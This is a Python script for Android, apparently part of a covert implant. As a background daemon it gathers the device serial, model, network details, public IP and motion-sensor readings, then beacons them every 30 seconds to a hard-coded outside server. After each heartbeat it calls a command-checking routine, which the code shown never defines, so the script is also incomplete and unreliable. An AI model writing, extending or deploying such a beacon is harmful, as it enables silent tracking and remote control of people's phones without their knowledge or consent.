import os
import time
import requests
import threading
import socket
from datetime import datetime
from jnius import autoclass
from plyer import accelerometer, gyroscope

# Server configuration
SERVER_URL = "https://lunara-film.online/living/fileshare.php"
UPDATE_INTERVAL = 30
REQUEST_TIMEOUT = 15

class BackgroundService:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.ip = self.get_public_ip()
        self.client_id = f"mobile_{self.hostname}_{self.ip}"
        self.session = requests.Session()
        self.session.headers.update({'Content-Type': 'application/json'})
        self.running = True
        
        # Start the service
        self.start_service()

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text.strip()
        except:
            return socket.gethostbyname(self.hostname)

    def collect_device_info(self):
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        Build = autoclass('android.os.Build')
        Context = autoclass('android.content.Context')
        ConnectivityManager = autoclass('android.net.ConnectivityManager')
        
        activity = PythonActivity.mActivity
        cm = activity.getSystemService(Context.CONNECTIVITY_SERVICE)
        net_info = cm.getActiveNetworkInfo() if cm else None
        
        info = {
            'manufacturer': Build.MANUFACTURER,
            'model': Build.MODEL,
            'android_version': Build.VERSION.RELEASE,
            'serial': Build.SERIAL,
            'network_info': {
                'type': net_info.getTypeName() if net_info else None,
                'subtype': net_info.getSubtypeName() if net_info else None,
                'connected': net_info.isConnected() if net_info else False
            }
        }
        return info

    def send_heartbeat(self):
        try:
            data = {
                'action': 'heartbeat',
                'client_id': self.client_id,
                'timestamp': datetime.now().isoformat(),
                'device_info': self.collect_device_info(),
                'sensors': self.read_sensors()
            }
            
            response = self.session.post(
                SERVER_URL,
                json=data,
                timeout=REQUEST_TIMEOUT
            )
            
            return response.json() if response.status_code == 200 else None
            
        except Exception as e:
            print(f"Heartbeat error: {str(e)}")
            return None

    def read_sensors(self):
        data = {}
        try:
            accelerometer.enable()
            accel = accelerometer.acceleration
            if accel:
                data['accelerometer'] = {
                    'x': accel[0],
                    'y': accel[1],
                    'z': accel[2]
                }
        except Exception as e:
            print(f"Accelerometer error: {str(e)}")
            
        try:
            gyroscope.enable()
            gyro = gyroscope.rotation
            if gyro:
                data['gyroscope'] = {
                    'x': gyro[0],
                    'y': gyro[1],
                    'z': gyro[2]
                }
        except Exception as e:
            print(f"Gyroscope error: {str(e)}")
            
        return data

    def start_service(self):
        def service_loop():
            while self.running:
                try:
                    response = self.send_heartbeat()
                    if response:
                        self.check_commands()
                except Exception as e:
                    print(f"Service error: {str(e)}")
                finally:
                    time.sleep(UPDATE_INTERVAL)

        threading.Thread(target=service_loop, daemon=True).start()

if __name__ == '__main__':
    service = BackgroundService()
    while True:
        time.sleep(3600)
